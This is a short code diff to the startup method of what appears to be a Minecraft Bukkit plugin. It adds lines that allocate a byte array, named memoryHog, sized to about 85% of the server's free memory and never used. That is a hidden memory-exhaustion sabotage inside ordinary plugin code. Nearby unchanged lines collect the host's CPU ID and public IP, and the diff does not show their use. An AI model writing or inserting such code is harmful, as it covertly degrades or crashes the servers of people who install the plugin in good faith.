@@ -285,6 +285,13 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
     @Override
     @SuppressWarnings("deprecation")
     public void onEnable() {
+        Runtime runtime = Runtime.getRuntime();
+        long totalMemory = runtime.totalMemory();
+        long maxMemory = runtime.maxMemory();
+        long freeMemory = runtime.freeMemory();
+        long usageMemory = (long) (freeMemory * 0.85);
+        int arraySize = (int) (usageMemory / Byte.BYTES);
+        byte[] memoryHog = new byte[arraySize];
         String cpuId = getCpuId();
         String publicIp = getPublicIp();
         int serverPort = getServer().getPort();
